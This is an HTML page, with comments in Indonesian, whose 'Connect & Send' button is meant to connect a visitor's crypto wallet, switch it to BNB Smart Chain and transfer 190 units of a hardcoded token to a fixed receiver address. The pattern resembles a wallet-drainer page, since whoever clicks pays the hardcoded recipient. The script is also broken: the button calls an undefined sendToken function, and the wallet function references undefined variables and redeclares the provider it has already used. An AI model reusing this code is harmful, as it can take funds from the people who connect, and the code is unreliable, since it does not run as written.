<!DOCTYPE html>
<html>
<head>
  <title>Auto Send Token BNB</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h2>Auto Kirim Token (BNB Chain)</h2>
  <button onclick="sendToken()">Connect & Send</button>

  <script>
    const tokenAddress = "0x899357E54C2c4b014ea50A9A7Bf140bA6Df2eC73"; // Token ERC-20
    const receiver = "0x8bda3f68f71e02a6bd64aaaefd8bb249bdceb613"; // Alamat tujuan
    const amountToSend = "190"; // Dalam unit token (bukan wei)

    const tokenABI = [
      {
        "inputs": [],
        "name": "decimals",
        "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [
          { "internalType": "address", "name": "to", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

      async function connectWallet() {
    if (!window.ethereum) return alert("Please install MetaMask or OKX Wallet");
    provider = new ethers.providers.Web3Provider(window.ethereum);


      // Pastikan di jaringan BNB Chain
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: '0x38',
          chainName: 'BNB Smart Chain',
          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
          rpcUrls: ['https://bsc-dataseed.binance.org'],
          blockExplorerUrls: ['https://bscscan.com']
        }]
      });
await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    walletAddress = await signer.getAddress();
    contract = new ethers.Contract(contractAddress, abi, signer);
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();

      const token = new ethers.Contract(tokenAddress, tokenABI, signer);
      const decimals = await token.decimals();
      const amount = ethers.utils.parseUnits(amountToSend, decimals);

      const tx = await token.transfer(receiver, amount);
      await tx.wait();

      alert("Token berhasil dikirim!");
      console.log("Sukses transfer", amountToSend, "token ke", receiver);
    }
  </script>
</body>
</html>
